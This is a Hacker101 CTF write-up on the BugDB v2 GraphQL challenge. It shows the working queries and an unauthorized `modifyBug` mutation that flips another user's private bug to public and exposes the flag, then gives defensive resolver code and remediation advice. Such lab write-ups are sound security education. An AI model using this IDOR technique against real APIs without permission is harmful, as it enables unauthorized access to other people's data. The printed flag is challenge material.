# BugDB v2 - Hacker101 CTF

Platform: Hacker101 CTF
Difficulty: Easy
Category: Web, GraphQL
Flags: 1/1
Date: (upisi datum)

---

## Overview

BugDB v2 is the follow-up to BugDB v1. It is the same bug-tracking application built on GraphQL, with two bugs in the database: a public one owned by `admin` and a private one owned by `victim`. The goal was to read the text of the private bug and retrieve the flag.

The first version could be solved with a `node` query that bypassed the split between the `Bugs` and `Bugs_` types. In v2 that gap was closed: the `node` interface no longer exposes the private bug's text to an unauthorized user. But the schema now includes a `mutation` type called `MyMutations`, and the developer did not apply the same authorization check to mutations. That is where the second version falls apart.

---

## Reconnaissance

The GraphiQL interface opened with two root types in the Documentation Explorer:

- `query: Query`
- `mutation: MyMutations`

The presence of a mutation type was the first thing that stood out. In v1 there were no mutations at all, which meant the attack surface was read-only. In v2 the attacker can write.

The root query type was similar to v1:

- `node(id: ID!)`
- `user(...)`, `bug(...)`
- `findUser(username)`, `findBug(_: String)`
- `allUsers(...)`, `allBugs(...)`

The mutation type was the new part. Browsing it revealed the available mutations, including `modifyBug`, which took an `id` and a set of fields to change on a bug.

At this point I had a hypothesis: if `modifyBug` does not verify that the caller owns the bug, then any user can flip the `private` flag on any bug, and then read it through the normal `allBugs` query.

---

## Baseline: what the normal user sees

Before trying anything clever, I confirmed the intended behavior. Calling `allBugs` as an unprivileged user:

```graphql
{
  allBugs {
    id
    reporterId
    private
    text
    reporter {
      username
    }
  }
}
```

returned only one bug:

```json
{
  "data": {
    "allBugs": [
      {
        "id": "QnVnczox",
        "reporterId": 1,
        "private": false,
        "text": "This is an example bug",
        "reporter": { "username": "admin" }
      }
    ]
  }
}
```

So the private bug owned by `victim` was correctly filtered out. The list query itself was not the vulnerability this time. The filtering happened at the resolver level, not at the type level, which is an improvement over v1.

I also tried the `node` query from v1 to see whether the old bug was still present:

```graphql
{
  node(id: "QnVnczoy") {
    id
    ... on Bugs_ {
      id
      text
      private
      reporterId
    }
  }
}
```

The response did not return the private bug's text, which confirmed that the v1 path had been patched.

---

## Exploitation

With the read path closed, I turned to the mutation. The `modifyBug` mutation accepted an `id` and a `private` boolean. I sent:

```graphql
mutation {
  modifyBug(id: 2, private: false) {
    ok
  }
}
```

The server responded:

```json
{
  "data": {
    "modifyBug": {
      "ok": true
    }
  }
}
```

That was the whole exploit. There was no ownership check, no role check, and no confirmation that I was allowed to modify this bug. The bug's `private` flag was set to `false` by a user who did not own it.

I then re-ran the same `allBugs` query from the baseline:

```graphql
{
  allBugs {
    id
    reporterId
    private
    text
    reporter {
      username
    }
  }
}
```

The response now contained both bugs:

```json
{
  "data": {
    "allBugs": [
      {
        "id": "QnVnczox",
        "reporterId": 1,
        "private": false,
        "text": "This is an example bug",
        "reporter": { "username": "admin" }
      },
      {
        "id": "QnVnczoy",
        "reporterId": 2,
        "private": false,
        "text": "^FLAG^96563de2422aad40c1fd4a8b848250e8955003522a5563e2c787e1415e52ef30$FLAG$",
        "reporter": { "username": "victim" }
      }
    ]
  }
}
```

The private bug was now public, and its `text` field contained the flag.

---

## Why it worked

This is a write-side IDOR. The `modifyBug` mutation trusted the client to send the ID of a bug the caller was allowed to modify. There was no check that the bug belonged to the authenticated user, and no check that the caller had the privilege to change the `private` flag at all.

It is worth noting what the developer got right this time. The `allBugs` query no longer leaks private bugs through the type system, and the `node` interface no longer bypasses the filter. Those were the two holes in v1, and both were fixed. But the fix was applied only to the read path. The write path, which did not exist in v1, was added in v2 without the same authorization logic, and that reopened the exact same class of vulnerability from a different direction.

This is a common pattern in real applications. A team fixes a reported bug by hardening the endpoint that was exploited, but does not audit the other endpoints that touch the same data. The attacker then moves to a different endpoint and achieves the same outcome. Authorization must be applied to every resolver that reads or writes the resource, not only to the one that was reported.

---

## How to prevent it

### Enforce ownership on every mutation

Every mutation that takes an object ID must verify that the caller is allowed to modify that object:

```javascript
const resolver = (parent, args, context) => {
  const bug = db.getBug(args.id);
  if (!bug) throw new Error("Not found");
  if (bug.reporterId !== context.user.id && !context.user.isAdmin) {
    throw new ForbiddenError("You do not own this bug");
  }
  return db.updateBug(args.id, args);
};
```

The check must run before any write happens, and it must fail closed. Returning `null` or an empty result is not enough if the write has already been performed.

### Use field-level authorization for sensitive fields

Even if a user can modify their own bug, they may not be allowed to change certain fields. In this case, `private` is a policy field that the application might want to control, not the user. A field-level check prevents the caller from setting it to whatever they want:

```javascript
if (args.private !== undefined && !context.user.canChangeVisibility) {
  throw new ForbiddenError("Cannot change visibility");
}
```

### Audit the whole resource surface, not just the reported endpoint

When a vulnerability is reported on one endpoint, the same authorization logic should be applied to every endpoint that touches the same resource. In BugDB, the resource is a bug, and the endpoints are `allBugs`, `bug`, `findBug`, `node`, and `modifyBug`. Fixing only the read endpoints leaves the write endpoint open. Fixing only `allBugs` leaves `node` open. The rule is simple: every path to the resource needs the same check.

### Do not assume that a read-side fix closes the write-side hole

Read and write operations are often implemented in different files, by different developers, at different times. An authorization policy that is enforced in one place is not enforced everywhere. Centralize authorization logic in a middleware or a policy layer that every resolver calls, so that a new mutation cannot be added without it.

### Log mutations on sensitive resources

Writes to sensitive fields should be logged with the user, the resource, the old value, and the new value. A sudden spike in `modifyBug` calls that change `private` from `true` to `false`, on bugs the caller does not own, is a clear signal of an attack. This kind of logging is also useful for forensic analysis after an incident.

---

## Comparison with BugDB v1

| Aspect | BugDB v1 | BugDB v2 |
|--------|----------|----------|
| Mutations | None | `modifyBug` |
| Read-side filtering | Weak (type split) | Strong (resolver filter) |
| `node` bypass | Worked | Patched |
| Write-side authorization | N/A | Missing |
| Exploit primitive | Read private bug via `node` | Flip `private` via mutation |

The lesson from the two challenges together is that a GraphQL API must be audited along two axes at once: every type and every field (read), and every mutation (write). Fixing one axis while ignoring the other leaves the application exploitable.

---

## What I took away from this challenge

1. Mutations are the new attack surface. When a GraphQL schema introduces mutations, the attacker can change state, not just read it. Every mutation is a potential IDOR, privilege escalation, or business logic flaw until proven otherwise.

2. Fixing a reported bug is not the same as fixing the class of bug. The developer patched the exact path from v1 and then introduced the same flaw in a new mutation. Authorization must be applied consistently across the resource, not reactively to the last report.

3. Read-side and write-side need separate authorization. A filter on `allBugs` does not protect `modifyBug`. Each resolver is its own trust boundary.

4. Flipping a boolean can be enough. In this case the entire exploit was setting `private: false` on someone else's bug. No data corruption, no injection, no fancy payload. Just one boolean that the server did not protect.

5. The v1 to v2 progression is realistic. Real applications evolve the same way: a vulnerability is reported, the affected endpoint is hardened, and a new feature is added that reopens the same hole. Thinking in terms of the underlying resource, not the specific endpoint, is how to avoid that trap.

6. Introspection plus mutations equals full API control. Once an attacker can enumerate the schema and send mutations, they can exercise every write path the developer exposed. Introspection should be disabled in production as one layer of defense, but the real fix is authorization on every resolver.

---

## References

- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- OWASP Top 10 - A01:2021 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- GraphQL mutations specification: https://graphql.org/learn/queries/#mutations
- CWE-639: Authorization Bypass Through User-Controlled Key: https://cwe.mitre.org/data/definitions/639.html
- CWE-285: Improper Authorization: https://cwe.mitre.org/data/definitions/285.html
- CWE-862: Missing Authorization: https://cwe.mitre.org/data/definitions/862.html
